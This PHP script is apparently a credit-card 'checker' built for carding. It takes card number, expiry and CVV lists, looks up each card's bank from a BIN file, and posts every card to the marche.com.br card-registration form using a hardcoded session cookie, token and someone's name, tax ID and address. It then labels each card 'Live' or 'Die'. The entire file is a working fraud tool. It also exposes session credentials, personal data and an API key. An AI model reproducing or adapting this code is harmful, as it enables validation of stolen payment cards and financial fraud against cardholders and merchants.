<?php
include_once('include.php');

    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $list = $_POST['lista'];
    }elseif($_SERVER['REQUEST_METHOD'] == 'GET'){
        $list = $_GET['lista'];
    }


    function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
    }

     function multiexplode($delimiters, $string) {
        $ready = str_replace($delimiters, $delimiters[0], $string);
        $launch = explode($delimiters[0], $ready);
        return $launch;
    }

    
    $explode = multiexplode(array(";", "»", "|", ":", " ", "/"), $list);
    $explode = array_values(array_filter($explode));
    @$cc  = trim($explode[0]);
    @$mes = trim($explode[1]);
    @$ano = trim($explode[2]);
    @$cvv = trim($explode[3]);

        function getBin($cc){
    $bin = substr($cc, 0, 6);
    $searchfor = $bin;
    $contents = file_get_contents('bins.csv');
    $pattern = preg_quote($searchfor, '/');
    $pattern = "/^.*$pattern.*\$/m";
    if (preg_match_all($pattern, $contents, $matches)) {
        $encontrada = implode("\n", $matches[0]);
    }
    $pieces = explode(";", $encontrada);
    $c = count($pieces);
    if ($c == 8) {
    $pais = $pieces[4];
    $paiscode = $pieces[5];
    $banco = $pieces[2];
    $level = $pieces[3];
    $bandeira = $pieces[1];
    } else {
     $pais = $pieces[5];
     $paiscode = $pieces[6];
     $level = $pieces[4];
     $banco = $pieces[2];
     $bandeira = $pieces[1];
    }
    return ''.$bandeira.' '.$banco.' '.$level.'('.$pais.')';
    }
    $info = getBin($cc);

    switch ($ano) { 
        case '2021':$ano = '21';break;
        case '2022':$ano = '22';break;
        case '2023':$ano = '23';break;
        case '2024':$ano = '24';break;
        case '2025':$ano = '25';break;
        case '2026':$ano = '26';break;
        case '2027':$ano = '27';break;
        case '2028':$ano = '28';break;
        case '2029':$ano = '29';break;
        case '2030':$ano = '30';break;
    }

        switch ($mes) { 
        case '1':$mes = '01';break;
        case '2':$mes = '02';break;
        case '3':$mes = '03';break;
        case '4':$mes = '04';break;
        case '5':$mes = '05';break;
        case '6':$mes = '06';break;
        case '7':$mes = '07';break;
        case '8':$mes = '08';break;
        case '9':$mes = '09';break;
    }

    switch (substr($cc, 0, 1)) {
        case '4':
        $typeCard = 1;
        $typeName = 'Visa';
        break;
        case '5':
        $typeCard = 2;
        $typeName = 'Master';
        break;
        case '3':
        $typeCard = 3;
        $typeName = 'American Express';
        break;
    }

    function __curl($data, $postdata = false, $header = false){ 


    //$ch = curl_init('ttps://api.scrapingant.com/v1/general?url=https%3A%2F%2Fexample.com');
    //curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    //curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    //'x-api-key: 395c9b83ae584752978d6422a2e9dea4',
    //));
    //$exec = curl_exec($ch);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $data);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_ENCODING, "");
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_COOKIESESSION, true);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() .'/cookie_bp.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() .'/cookie_bp.txt');
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    if($header){
    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);  
}
    if($postdata){
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);            
}
    $exec = curl_exec($ch);
    return $exec;
}

   //$link = __curl('https://www.marche.com.br/credit_cards/new');
   //$token = getStr($link, 'name="authenticity_token" value="', '" />');
   //$number = getStr($link, 'data-method="delete" href="', '"');
   //$session = getStr($link, 'href="?session=', '&res=styles.css"');

    $data = __curl('https://www.marche.com.br/credit_cards', 'utf8=%E2%9C%93&authenticity_token=YvVXAXzgaYws99WWaV0sIVqL6NjARuv%2BBV9GHEVMel%2BKQ7O89T0p34ZWBLFDyeNk2nqhCbmYCc3p7b46zL6xmA%3D%3D&gateway_credit_card%5Bcardholder%5D=LUCAS+JORGE&gateway_credit_card%5Btax_id%5D=67882447820&gateway_credit_card%5Bnumber%5D='.$cc.'&gateway_credit_card%5Bcredit_card_brand_id%5D=2&gateway_credit_card%5Bexpiration_month%5D='.$mes.'&gateway_credit_card%5Bexpiration_year%5D='.$ano.'&gateway_credit_card%5Bcvv%5D='.$cvv.'&gateway_credit_card%5Bremember_card%5D=0&gateway_credit_card%5Bremember_card%5D=1&zip_code%5Bcode%5D=04542000&zip_code%5Bstreet%5D=Rua+Leopoldo+Couto+de+Magalh%C3%A3es+J%C3%BAnior&address%5Bnumber%5D=152&address%5Bcomplement%5D=&zip_code%5Bdistrict%5D=Itaim+Bibi&zip_code%5Bcity%5D=S%C3%A3o+Paulo&zip_code%5Bstate%5D=SP&commit=Continuar', array(
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Encoding: gzip, deflate, br',
    'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control: max-age=0',
    'Connection: keep-alive',
    'Content-Type: application/x-www-form-urlencoded',
    'Cookie: device=MjM4OTQyMTM%3D--dcacaff7af318c531b9c2a8af7f581e1aae022a5; user_zip_code=04542000; user_hub_id=1; ahoy_visit=4ef864a8-292a-452b-a392-232757ae9a10; ahoy_visitor=2045ae6c-dd0f-4eb4-90fa-cbeac47fba2d; remember_user_token=W1sxNTM2MjFdLCIkMmEkMTEkbXlNYTJsekViMC9icnpTUzUzTTZqTyIsIjE2MjQ4MDk2NzIuNTM1MDY4OCJd--d4512ff1ca298efd1d798da65001aa6573ceca84; back_location=Imh0dHBzOi8vd3d3Lm1hcmNoZS5jb20uYnIvY3JlZGl0X2NhcmRzL25ldyI%3D--e093a92defd0776e9b9b77a3783ca9b33f1d17d0; _st_marche_ecomm_session=cDZURWhXMkl3cTZ1RHhrRE5KSWRBbFFNODIzdXBSTnM0MHlGUTl6cWhSZGRETVMxdGJYQ28vV1lKVjRsYW9LQmxVd1A4aWw5NG1lelk2VytialV6S0ZDMkNMV1ZQcjhocTFEWUtKd2xQQ0pJMEdWRTlFNXRUMFdUZWVzSzhWeGJsOFl1QmZhd05SZVFnVDZiNFlwSXppcG5TeFVaV0h1SEtPeGpLM09IUUt2dEJsQmwyckJHb2lsUnYwWStHTGVicHQ1SGRYZUIwMmFtWTFicEVYVGVmeGJnUlJzS2x0dlNxVEpNazI0WkIyNjJZWU1wSWVIbWQ0Y0JHTVR0cjNLeC0td2V4VStRN1k1Z2RIZldYUlBGWmRqdz09--0a3c67d558e9d3a52361838240de1e97db6f05f0',
    'Host: www.marche.com.br',
    'Origin: https://www.marche.com.br',
    'Referer: https://www.marche.com.br/credit_cards/new',
    'sec-ch-ua: " Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"',
    'sec-ch-ua-mobile: ?0',
    'Sec-Fetch-Dest: document',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-User: ?1',
    'Upgrade-Insecure-Requests: 1',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36'));

    //print_r($data);

    if (strpos($data, 'Forma de pagamento selecionada. Agora só falta revisar e finalizar seu pedido!')) {
    echo '<li class="list-group-item"><h6>#{Live} Authorized ~ '.$cc.'|'.$mes.'|20'.$ano.'|'.$cvv.' ~ Return: 0 ~ '.$info.' ~ Valor: R$ 5,00 #Hyz0</li>';
    }else{
    echo '<li class="list-group-item"><h6>#{Die} Unauthorized ~ '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' ~ Return: 1 '.$info.' ~ Valor: R$ 5,00 #Hyz0</li>';
}
?>